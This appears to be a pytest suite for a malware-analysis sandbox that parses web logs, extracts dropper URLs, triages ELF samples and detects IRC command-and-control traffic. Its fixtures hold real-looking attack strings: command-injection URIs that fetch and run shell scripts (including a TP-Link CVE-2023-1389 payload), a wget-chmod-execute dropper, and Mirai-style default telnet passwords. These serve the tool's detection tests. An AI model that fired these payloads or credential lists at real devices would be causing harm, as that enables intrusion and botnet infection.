"""Ninja Sandbox tests: parsers, sensor aggregation + droppers, static triage + ELF parser, dynamic analysis on a
strace/sinkhole fixture, Adversary DNA, settings/telemetry redaction, and the API end to end (no Docker needed:
the cell is stubbed where it would spawn containers).

    pytest -q tests
"""
from __future__ import annotations

import json
import os
import struct
import sys
import time

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)


@pytest.fixture(autouse=True)
def data_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("SANDBOX_DATA", str(tmp_path / "data"))
    for m in [m for m in list(sys.modules) if m.startswith("sandbox")]:
        del sys.modules[m]
    import sandbox.config as cfg
    cfg.ensure_dirs()
    yield tmp_path / "data"


# ── parsers ───────────────────────────────────────────────────────────────────────────────────────────────
CADDY = json.dumps({"ts": 1763377323.1, "status": 404, "size": 0, "request": {"remote_ip": "172.71.1.1", "client_ip": "172.71.1.1", "method": "GET",
                    "host": "example.com", "uri": "/shell?cd+/tmp;rm+-rf+*;wget+http://45.1.2.3/jaws.sh;sh+jaws.sh",
                    "headers": {"User-Agent": ["Hello, world"], "Cf-Connecting-Ip": ["185.220.101.7"], "Cf-Ipcountry": ["NL"]}}})
NGINX = '185.220.101.8 - - [17/Nov/2026:11:02:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http://45.1.2.3/tplink.sh) HTTP/1.1" 404 153 "-" "curl/8.0"'
VHOST = 'shop.example.com 91.200.12.9 - - [17/Nov/2026:11:02:04 +0000] "POST /wp-login.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"'
TRAEFIK = json.dumps({"ClientHost": "185.220.101.9", "RequestHost": "api.example.com", "RequestMethod": "GET", "RequestPath": "/.env", "DownstreamStatus": 403,
                      "DownstreamContentSize": 0, "StartUTC": "2026-11-17T11:02:05Z", "request_User-Agent": "python-requests/2.31"})


def test_parsers_all_formats():
    from sandbox.sensor import parsers
    c = parsers.parse(CADDY, "auto")
    assert c["ip"] == "185.220.101.7" and c["cc"] == "NL" and c["path"] == "/shell" and c["status"] == 404
    n = parsers.parse(NGINX, "nginx")
    assert n["ip"] == "185.220.101.8" and n["status"] == 404 and n["user_agent"] == "curl/8.0" and abs(n["ts"] - 1794913323) < 1
    v = parsers.parse(VHOST, "apache")
    assert v["host"] == "shop.example.com" and v["method"] == "POST" and v["size"] == 1024
    t = parsers.parse(TRAEFIK, "auto")
    assert t["ip"] == "185.220.101.9" and t["path"] == "/.env" and t["status"] == 403
    assert parsers.parse("garbage line", "auto") is None


def test_syslog_framing_stripped():
    from sandbox.sensor.inputs import strip_syslog
    assert strip_syslog("<134>Nov 17 11:02:03 edge nginx: " + VHOST).startswith("shop.example.com 91.200.12.9")
    assert strip_syslog("<14>1 2026-11-17T11:02:03Z edge caddy - - - " + CADDY).startswith("{")


# ── sensor core: families, droppers, aggregation ──────────────────────────────────────────────────────────
def test_droppers_and_families():
    from sandbox.sensor import core
    assert core.droppers("/shell?cd+/tmp;rm+-rf+*;wget+http://45.1.2.3/jaws.sh;sh+jaws.sh") == ["http://45.1.2.3/jaws.sh"]
    assert "http://45.1.2.3/tplink.sh" in core.droppers("/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http://45.1.2.3/tplink.sh)")
    assert core.droppers("/goform/set_LimitClient_cfg?mac=00:00&url=curl%20http://1.2.3.4:8080/bins/x86") == ["http://1.2.3.4:8080/bins/x86"]
    assert core.droppers("/index.html") == []
    assert core.classify_path("/shell?cd+/tmp") == ("jaws-webserver", None)
    assert core.classify_path("/cgi-bin/luci/;stok=/locale")[1] == "CVE-2023-1389"
    assert core.classify_path("/about") is None


def test_aggregate_keeps_global_drops_owner_and_cf():
    from sandbox.sensor import core, parsers
    agg = core.Agg()
    owner = core.load_nets(["91.200.12.0/24"])
    for ln, fmt in ((CADDY, "caddy"), (NGINX, "nginx"), (VHOST, "apache"), (TRAEFIK, "traefik")):
        agg.add(parsers.parse(ln, fmt), owner)
    agg.add({"ip": "10.0.0.5", "uri": "/", "host": "x", "status": 200, "size": 0, "user_agent": "", "ts": time.time()}, owner)
    agg.add({"ip": "104.16.1.1", "uri": "/", "host": "x", "status": 200, "size": 0, "user_agent": "", "ts": time.time()}, owner)
    ips = {r["ip"] for r in agg.rows()}
    assert ips == {"185.220.101.7", "185.220.101.8", "185.220.101.9"}      # owner net, private, Cloudflare edge dropped
    assert agg.dropped == 3
    row = agg.ips["185.220.101.7"]
    assert row["droppers"] == ["http://45.1.2.3/jaws.sh"] and row["cc"] == "NL" and list(row["probes"].values())[0]["family"] == "jaws-webserver"
    assert len(agg.droppers) == 2 and {d["url"] for d in agg.droppers} == {"http://45.1.2.3/jaws.sh", "http://45.1.2.3/tplink.sh"}


# ── static triage + ELF ───────────────────────────────────────────────────────────────────────────────────
def minimal_elf(machine=62, bits=64, needed=None) -> bytes:
    """A tiny valid-enough ELF: header + one LOAD segment + (optionally) a DYNAMIC segment with DT_NEEDED."""
    needed = needed or []
    strtab = b"\x00" + b"".join(n.encode() + b"\x00" for n in needed)
    body_off = 0x200
    dyn = b""
    if needed:
        off = 1
        for n in needed:
            dyn += struct.pack("<qQ", 1, off)   # DT_NEEDED
            off += len(n) + 1
        dyn += struct.pack("<qQ", 5, 0x400000 + body_off)  # DT_STRTAB (vaddr)
        dyn += struct.pack("<qQ", 0, 0)
    dyn_off = body_off + len(strtab)
    payload = strtab + dyn + b"Hello, world\x00/bin/busybox\x00wget http://45.1.2.3/x86\x00root\x00admin\x00xc3511\x00vizxv\x00888888\x00juantech\x00"
    phnum = 2 if needed else 1
    e_ident = b"\x7fELF" + bytes([2 if bits == 64 else 1, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack("<HHIQQQIHHHHHH", 2, machine, 1, 0x401000, 64, 0, 0, 64, 56, phnum, 64, 0, 0)
    ph = struct.pack("<IIQQQQQQ", 1, 5, 0, 0x400000, 0x400000, body_off + len(payload), body_off + len(payload), 0x1000)
    if needed:
        ph += struct.pack("<IIQQQQQQ", 2, 6, dyn_off, 0x400000 + dyn_off, 0x400000 + dyn_off, len(dyn), len(dyn), 8)
    head = ehdr + ph
    return head + b"\x00" * (body_off - len(head)) + payload


def test_elf_parser_and_triage():
    from sandbox import elf, triage
    b = minimal_elf(needed=["libc.so.6", "libpthread.so.0"])
    e = elf.parse(b)
    assert e["is_elf"] and e["machine"] == "x86-64" and e["bits"] == 64 and e["needed"] == ["libc.so.6", "libpthread.so.0"]
    assert e["linkage"] == "dynamic" and e["stripped"] and not e["errors"]
    rec = triage.triage_bytes(b, len(b), time.time())
    assert rec["kind"] == "elf" and rec["arch"] == "x86-64" and rec["iocs"]["urls"] == ["http://45.1.2.3/x86"]
    assert rec["credentials"]["default_credentials_seen"] >= 5
    assert "telnet brute table" in rec["static_verdict"] or "default-credential" in rec["static_verdict"]
    assert any("busybox" in s for s in rec["interesting_strings"])
    assert elf.parse(b"\x7fELF" + b"\x00" * 10)["errors"]
    assert triage.kind_of(b"#!/bin/sh\ncd /tmp; wget http://1.2.3.4/x; chmod +x x; ./x")[0] == "script"
    assert triage.kind_of(b"MZ\x90\x00")[0] == "pe"
    rec32 = triage.triage_bytes(minimal_elf(machine=40, bits=32), 100, time.time())
    assert rec32["arch"] == "arm" and rec32["bits"] == 32


# ── dynamic analysis on a fixture ─────────────────────────────────────────────────────────────────────────
STRACE = """1 12:00:00.000100 execve("/tmp/x", ["/tmp/x"], 0x7ffd) = 0
1 12:00:00.001000 prctl(PR_SET_NAME, "sshd\\0") = 0
1 12:00:00.001200 openat(AT_FDCWD, "/proc/cpuinfo", O_RDONLY) = 3
1 12:00:00.001300 openat(AT_FDCWD, "/dev/watchdog", O_WRONLY) = -1 ENOENT (No such file or directory)
1 12:00:00.001400 openat(AT_FDCWD, "/etc/rc.local", O_WRONLY|O_CREAT|O_TRUNC, 0644) = -1 EROFS (Read-only file system)
1 12:00:00.002000 unlink("/tmp/x") = 0
1 12:00:00.003000 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 2
1 12:00:00.004000 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 4
1 12:00:00.004100 connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr("45.9.9.9")}, 16) = -1 EINPROGRESS (Operation now in progress)
1 12:00:00.104100 connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr("45.9.9.9")}, 16) = 0
1 12:00:01.004100 connect(5, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr("45.9.9.9")}, 16) = 0
1 12:00:02.004100 connect(6, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr("45.9.9.9")}, 16) = 0
1 12:00:03.004100 connect(7, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr("45.9.9.9")}, 16) = 0
1 12:00:04.004100 connect(8, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr("45.9.9.9")}, 16) = 0
""" + "".join(f'2 12:00:05.{i:06d} connect(9, {{sa_family=AF_INET, sin_port=htons(23), sin_addr=inet_addr("1.2.{i}.4")}}, 16) = -1 EINPROGRESS (Operation now in progress)\n' for i in range(40))
SINK = "\n".join(json.dumps(x) for x in [
    {"kind": "dns", "qname": "irc.evil.example", "answered": "10.66.0.2", "ts": "2026-11-17T12:00:00.004Z"},
    {"kind": "tcp", "src": "10.66.0.3", "dst": "45.9.9.9", "dport": 6667, "bytes": 30, "head_text": "NICK x86|12345\\r\\nUSER a b c :d\\r\\n", "head_hex": "4e49434b", "ts": "2026-11-17T12:00:00.105Z"},
])


def test_dynamic_analysis_c2_scan_attack(tmp_path):
    from sandbox import reverse
    out = tmp_path / "out"
    out.mkdir()
    (out / "strace.txt").write_text(STRACE)
    (out / "sinkhole.jsonl").write_text(SINK + "\n")
    r = reverse.analyse_dynamic(str(out), "10.66.0.2")
    assert r["c2_likely"][0]["endpoint"] == "45.9.9.9:6667" and r["c2_protocol"] == "IRC" and r["dns"] == ["irc.evil.example"]
    assert r["scan_targets"] == 40 and 23 in r["scan_ports"]
    assert r["self_deleted"] and r["procs"]["forks"] == 1 and r["procs"]["names"] == ["sshd"]
    assert "/etc/rc.local" in r["files"]["persistence"] and "/dev/watchdog" in r["files"]["defence"] and "/proc/cpuinfo" in r["files"]["recon"]
    tids = {a["technique"] for a in r["attack"]}
    assert {"T1071", "T1568", "T1046", "T1110", "T1037/T1053", "T1070.004", "T1562", "T1036", "T1082"} <= tids
    assert r["verdict"].startswith("C2 irc.evil.example") and "IRC" in r["verdict"]
    assert r["timeline"][0]["call"] == "execve" and r["timeline"][1]["t_ms"] == 1
    assert r["errors"]["EROFS"] == 1 and r["syscalls"]["connect"] == 46


# ── DNA ───────────────────────────────────────────────────────────────────────────────────────────────────
def test_dna_profiles_and_clusters():
    from sandbox import dna
    t0 = time.time() - 3600
    paths = ["/.env", "/wp-login.php", "/admin", "/.git/config", "/phpmyadmin/", "/shell?cd+/tmp", "/cgi-bin/luci", "/xmlrpc.php"]
    reqs = []
    for ip in ("185.220.101.1", "185.220.101.2"):     # two IPs with the same behaviour -> one cluster
        for i, p in enumerate(paths):
            reqs.append({"ts": t0 + i, "host": "x", "path": p.split("?")[0], "uri": p, "method": "GET", "status": 404, "size": 0, "ip": ip, "user_agent": "python-requests/2.31"})
    for i in range(6):                           # a browser-like visitor
        reqs.append({"ts": t0 + i * 10, "host": "x", "path": "/blog", "uri": "/blog", "method": "GET", "status": 200, "size": 5000, "ip": "185.220.101.3", "user_agent": "Mozilla/5.0 Chrome"})
    reqs.append({"ts": t0, "host": "x", "path": "/", "uri": "/", "method": "GET", "status": 200, "size": 1, "ip": "10.0.0.9", "user_agent": ""})
    r = dna.analyse(reqs, min_requests=3)
    assert r["status"] == "ok" and r["summary"]["profiled"] == 3 and r["summary"]["excluded_requests"] == 1
    assert r["profiles"]["185.220.101.1"]["archetype"]["primary"] in ("scanner", "brute-forcer", "targeted-operator", "targeted_operator")
    assert r["summary"]["clusters_found"] >= 1 and set(r["clusters"][0]["members"]) >= {"185.220.101.1", "185.220.101.2"}
    assert len(r["profiles"]["185.220.101.1"]["dna_vector"]) == r["summary"]["dna_dimensions"] == 18
    c = dna.compare(reqs, "185.220.101.1", "185.220.101.2")
    assert c["same_operator_likely"] and c["similarity"] > 0.99
    p = dna.profile_ip(reqs, "185.220.101.3")
    assert p["status"] == "ok" and p["narrative"]


# ── settings / telemetry ──────────────────────────────────────────────────────────────────────────────────
def test_settings_mask_and_telemetry_payload(data_dir):
    from sandbox import config
    from sandbox.sensor import run
    s = config.load_settings()
    assert s["mode"] == "self-hosted" and s["telemetry"]["enabled"] is False and s["telemetry"]["install_id"]
    s["byok"]["api_key"] = "sk-ant-abcdef123456"
    config.save_settings(s)
    pub = config.public_settings(config.load_settings())
    assert pub["byok"]["api_key"] == "…3456" and pub["byok"]["has_key"]
    rows = [{"ip": "185.220.101.7", "req": 3, "first": 1, "last": 2, "cc": "NL", "sites": {"a": {}}, "probes": {"/shell": {"family": "jaws-webserver", "cve": None, "count": 3}},
             "ua": {"mirai-hello": 3}, "status": {"s4xx": 3}, "droppers": ["http://45.1.2.3/jaws.sh"]}]
    pay = run.telemetry_payload(rows, s, [{"sha256": "a" * 64, "kind": "elf", "verdict": "C2 x", "origin": "edge:185.220.101.7"}])
    assert pay["sensor"]["rows"][0]["droppers"] == 1 and "uri" not in json.dumps(pay) and pay["samples"][0]["origin"] == "edge"
    assert pay["share_samples"] is False and "sk-ant" not in json.dumps(pay)


# ── API end to end (cell stubbed) ─────────────────────────────────────────────────────────────────────────
def test_api_flow(monkeypatch, tmp_path):
    from fastapi.testclient import TestClient
    from sandbox import api, cell, config
    c = TestClient(api.app)
    assert c.get("/").status_code == 200 and "Ninja Sandbox" in c.get("/").text
    st = c.get("/api/sandbox/status").json()
    assert st["samples"] == 0 and st["mode"] == "self-hosted"
    # upload an ELF
    b = minimal_elf(needed=["libc.so.6"])
    r = c.post("/api/sandbox/samples", files={"file": ("bot.x86", b)})
    assert r.status_code == 200, r.text
    sha = r.json()["sample"]["sha256"]
    assert r.json()["sample"]["kind"] == "elf"
    assert c.get("/api/sandbox/samples").json()["samples"][0]["sha256"] == sha
    rep = c.get(f"/api/sandbox/report/{sha}").json()
    assert rep["static"]["elf"]["needed"] == ["libc.so.6"] and rep["dynamic"] is None and "Not detonated" in " ".join(rep["summary"])
    assert "Hello, world" in c.get(f"/api/sandbox/report/{sha}/strings").json()["ascii"]
    assert c.get(f"/api/sandbox/report/{sha}/hex").json()["hex"].startswith("00000000  7f 45 4c 46")
    # a script is triaged but refused by the cell
    r2 = c.post("/api/sandbox/samples", files={"file": ("drop.sh", b"#!/bin/sh\ncd /tmp; wget http://1.2.3.4/x; chmod +x x; ./x\n")})
    sha2 = r2.json()["sample"]["sha256"]
    assert c.post(f"/api/sandbox/detonate/{sha2}").status_code == 400
    # cell not ready -> 503 with the readiness dict
    monkeypatch.setattr(cell, "docker_ok", lambda: {"ready": False, "docker": False})
    assert c.post(f"/api/sandbox/detonate/{sha}").status_code == 503
    # stub a successful detonation and check the report merges it
    out = tmp_path / "cellout"
    out.mkdir()
    (out / "strace.txt").write_text(STRACE)
    (out / "sinkhole.jsonl").write_text(SINK + "\n")

    def fake_detonate(sha_, meta, timeout=None):
        from sandbox import reverse
        rec = {"sha256": sha_, "run": {"status": "ran", "seconds": 60.0, "tracer": "strace", "image": "x"}, "detonated": config.now_iso(), "timeout_s": 60}
        rec.update(reverse.analyse_dynamic(str(out), "10.66.0.2"))
        json.dump(rec, open(os.path.join(config.DETONATIONS, f"{sha_}.json"), "w"))
        return rec
    monkeypatch.setattr(cell, "docker_ok", lambda: {"ready": True, "docker": True})
    monkeypatch.setattr(cell, "detonate", fake_detonate)
    r = c.post(f"/api/sandbox/detonate/{sha}?wait=1")
    assert r.status_code == 200 and r.json()["detonation"]["verdict"].startswith("C2 irc.evil.example")
    rep = c.get(f"/api/sandbox/report/{sha}").json()
    assert rep["dynamic"]["c2_likely"][0]["endpoint"] == "45.9.9.9:6667" and any("T1071" in a["technique"] for a in rep["dynamic"]["attack"])
    assert c.get("/api/sandbox/status").json()["c2_extracted"] == 1
    # explain without a key = deterministic lines, nothing called
    ex = c.post(f"/api/sandbox/explain/{sha}").json()
    assert ex["ok"] is False and "C2 irc.evil.example" in ex["text"]
    # settings round trip keeps the key when the masked value is echoed back
    c.put("/api/sandbox/settings", json={"byok": {"provider": "anthropic", "api_key": "sk-ant-xyz987"}, "cell": {"auto_detonate": True}})
    s = c.get("/api/sandbox/settings").json()
    assert s["byok"]["api_key"] == "…z987" and s["cell"]["auto_detonate"] is True
    c.put("/api/sandbox/settings", json={"byok": {"api_key": "…z987", "model": "claude-opus-5-5"}})
    assert c.get("/api/sandbox/settings").json()["byok"]["has_key"] is True
    assert c.get("/api/sandbox/telemetry/preview").json()["enabled"] is False
    # sensor ingest over the API feeds the picture and the droppers
    r = c.post("/api/sandbox/sensor/ingest", json={"lines": [CADDY, NGINX, VHOST, "junk"], "format": "auto"})
    assert r.json()["kept"] == 3 and r.json()["unparsed"] == 1
    pic = c.get("/api/sandbox/sensor").json()
    assert pic["ips"] == 3 and {d["url"] for d in pic["droppers"]} == {"http://45.1.2.3/jaws.sh", "http://45.1.2.3/tplink.sh"}
    assert c.post("/api/sandbox/droppers/fetch", json={"url": "http://45.1.2.3/jaws.sh"}).status_code == 403   # fetching is off by default
    kinds = [e["kind"] for e in c.get("/api/sandbox/events").json()["events"]]
    assert "dropper_seen" in kinds and "sample_ingested" in kinds
    assert c.delete(f"/api/sandbox/samples/{sha2}").json()["removed"] == 2


def test_token_auth(monkeypatch):
    from fastapi.testclient import TestClient
    from sandbox import api, config
    monkeypatch.setattr(config, "TOKEN", "s3cret")
    c = TestClient(api.app)
    assert c.get("/api/sandbox/status").status_code == 401
    assert c.get("/api/sandbox/status", headers={"X-Sandbox-Token": "s3cret"}).status_code == 200
    assert c.get("/").status_code == 200
